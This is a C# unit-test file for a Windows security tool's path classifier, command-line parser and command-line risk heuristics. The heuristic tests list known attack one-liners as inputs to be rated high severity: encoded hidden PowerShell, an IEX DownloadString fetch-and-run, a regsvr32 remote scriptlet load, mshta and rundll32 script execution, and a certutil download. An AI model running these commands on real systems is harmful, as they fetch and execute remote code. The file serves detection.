using SafetySecurity.Core.Parsing;
using SafetySecurity.Core.Rules;

namespace SafetySecurity.Core.Tests;

public class PathClassifierTests
{
    private readonly PathClassifier _c = new(TestEnv.Paths);

    [Theory]
    [InlineData(@"C:\Windows\System32\shell32.dll", PathKind.Windows)]
    [InlineData(@"%SystemRoot%\system32\svchost.exe", PathKind.Windows)]
    [InlineData(@"\SystemRoot\System32\drivers\x.sys", PathKind.Windows)]
    [InlineData(@"C:\Windows\Temp\a.exe", PathKind.Temp)]
    [InlineData(@"C:\Windows\System32\spool\drivers\color\x.dll", PathKind.Temp)]
    [InlineData(@"C:\Program Files\Google\Chrome\chrome.exe", PathKind.ProgramFiles)]
    [InlineData(@"C:\Program Files\WindowsApps\Microsoft.Paint_11.2609.401.0_x64__8wekyb3d8bbwe\PaintApp\mspaint.exe", PathKind.PackagedApp)]
    [InlineData(@"C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe", PathKind.PackagedApp)]
    [InlineData(@"C:\Program Files (x86)\Steam\steam.exe", PathKind.ProgramFiles)]
    [InlineData(@"C:\ProgramData\x\y.dll", PathKind.ProgramData)]
    [InlineData(@"C:\Users\jiyul\AppData\Roaming\evil.dll", PathKind.UserProfile)]
    [InlineData(@"%LOCALAPPDATA%\Temp\x.exe", PathKind.Temp)]
    [InlineData(@"C:\Users\Public\x.exe", PathKind.Public)]
    [InlineData(@"\\evil-server\share\x.dll", PathKind.Network)]
    [InlineData(@"D:\Games\game.exe", PathKind.Other)]
    [InlineData(@"""C:\Users\jiyul\Downloads\x.exe""", PathKind.UserProfile)]
    [InlineData(@"C:\Windows\..\Users\jiyul\x.dll", PathKind.UserProfile)]
    public void Classifies(string path, PathKind expected) => Assert.Equal(expected, _c.Classify(path));

    [Fact]
    public void NormalizesPrefixesAndCase()
    {
        Assert.Equal(@"c:\windows\system32\a.dll", _c.Normalize(@"\\?\C:\Windows\.\System32\\A.DLL"));
        Assert.Equal(@"c:\windows\system32\a.dll", _c.Normalize(@"\??\C:/Windows/System32/a.dll"));
    }

    [Fact]
    public void ExpandsKnownVariablesOnly() =>
        Assert.Equal(@"C:\Users\jiyul\AppData\Roaming\%UNKNOWN%\x", TestEnv.Paths.Expand(@"%APPDATA%\%UNKNOWN%\x"));
}

public class CommandLineTests
{
    [Fact]
    public void ParsesQuotedPathWithArguments()
    {
        var p = CommandLine.Parse(@"""C:\Program Files\App\app.exe"" --silent", TestEnv.Paths, null)!;
        Assert.Equal(@"C:\Program Files\App\app.exe", p.Executable);
        Assert.Equal("--silent", p.Arguments);
        Assert.False(p.IsUnquotedWithSpaces);
    }

    [Fact]
    public void FindsUnquotedPathByProbingFiles()
    {
        var fs = new FakeFileSystem().Add(@"C:\Program Files\My App\run.exe");
        var p = CommandLine.Parse(@"C:\Program Files\My App\run.exe -k", TestEnv.Paths, fs)!;
        Assert.Equal(@"C:\Program Files\My App\run.exe", p.Executable);
        Assert.Equal("-k", p.Arguments);
        Assert.True(p.IsUnquotedWithSpaces);
    }

    [Fact]
    public void ResolvesBareNamesToSystem32()
    {
        var p = CommandLine.Parse(@"rundll32 C:\Users\jiyul\a.dll,Start", TestEnv.Paths, new FakeFileSystem())!;
        Assert.Equal(@"C:\Windows\System32\rundll32.exe", p.Executable);
        Assert.Equal("rundll32.exe", p.FileName);
        Assert.Equal(@"C:\Users\jiyul\a.dll", CommandLineHeuristics.FindDllArgument(p.Arguments));
    }

    [Fact]
    public void ExpandsEnvironmentVariables()
    {
        var p = CommandLine.Parse(@"%SystemRoot%\system32\svchost.exe -k netsvcs -p", TestEnv.Paths, null)!;
        Assert.Equal(@"C:\Windows\system32\svchost.exe", p.Executable);
    }

    [Fact]
    public void TokenizesLikeWindows()
    {
        Assert.Equal(["a b", "c", @"d""e"], CommandLine.Tokenize(@"""a b"" c d\""e"));
    }

    [Theory]
    [InlineData(@"powershell.exe -nop -w hidden -enc SQBFAFgA", Model.Severity.High)]
    [InlineData(@"powershell -Command ""IEX (New-Object Net.WebClient).DownloadString('http://x')""", Model.Severity.High)]
    [InlineData(@"mshta.exe vbscript:Execute(""x"")", Model.Severity.High)]
    [InlineData(@"regsvr32 /s /n /u /i:http://evil/x.sct scrobj.dll", Model.Severity.High)]
    [InlineData(@"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication""", Model.Severity.High)]
    [InlineData(@"certutil -urlcache -split -f http://x/a.exe a.exe", Model.Severity.High)]
    [InlineData(@"cmd.exe /c powershell -c whoami", Model.Severity.Medium)]
    [InlineData(@"C:\Program Files\App\app.exe --minimized", Model.Severity.Info)]
    public void Heuristics(string cmd, Model.Severity expected)
    {
        var p = CommandLine.Parse(cmd, TestEnv.Paths, null)!;
        Assert.Equal(expected, CommandLineHeuristics.Analyze(p, new PathClassifier(TestEnv.Paths)).Severity);
    }
}
